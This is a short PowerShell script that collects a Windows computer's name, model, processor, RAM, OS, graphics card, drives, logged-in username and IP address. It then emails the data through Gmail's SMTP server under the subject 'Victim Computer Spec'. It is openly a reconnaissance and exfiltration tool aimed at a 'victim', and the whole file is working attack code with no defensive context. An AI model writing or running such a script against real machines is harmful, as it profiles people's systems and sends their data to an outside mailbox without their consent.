$computerSystem = Get-WmiObject Win32_ComputerSystem
$processor = Get-WmiObject Win32_Processor
$graphicsAdapter = Get-WmiObject Win32_VideoController
$storage = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | Select-Object DeviceID, Size, FreeSpace
$operatingSystem = Get-WmiObject Win32_OperatingSystem
$user = Get-WmiObject Win32_UserAccount | Where-Object {$_.Name -eq $env:username}
$ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString

$specifications = @{
    "Computer Name" = $computerSystem.Name;
    "Model" = $computerSystem.Model;
    "Processor" = "$($processor.Name) ($($processor.NumberOfCores) cores)";
    "RAM" = "$(( $computerSystem.TotalPhysicalMemory / 1GB )) GB";
    "OS System" = $operatingSystem.Caption;
    "Graphics Card" = $graphicsAdapter.Name;
    "Storage" = foreach ($drive in $storage) { "$($drive.DeviceID) ($($drive.Size / 1GB) GB, $($drive.FreeSpace / 1GB) GB Available)" };
    "Username Windows" = $user.Name;
    "Ip Address" = $ip;
}

$body = "Computer Spec:`n"

foreach ($spec in $specifications.GetEnumerator()) {
    $body += "$($spec.Key): $($spec.Value)`n"
}

$from = Read-Host -Prompt "Sender Mail ?"
$password = Read-Host -Prompt "Password ?" -AsSecureString
$to = Read-Host -Prompt "Receiver Mail ?"

$cred = New-Object System.Management.Automation.PSCredential($from, $password)

Send-MailMessage -From $from -To $to -Subject "Victim Computer Spec" -Body $body -SmtpServer "smtp.gmail.com" -Port "587" -UseSsl -Credential $cred
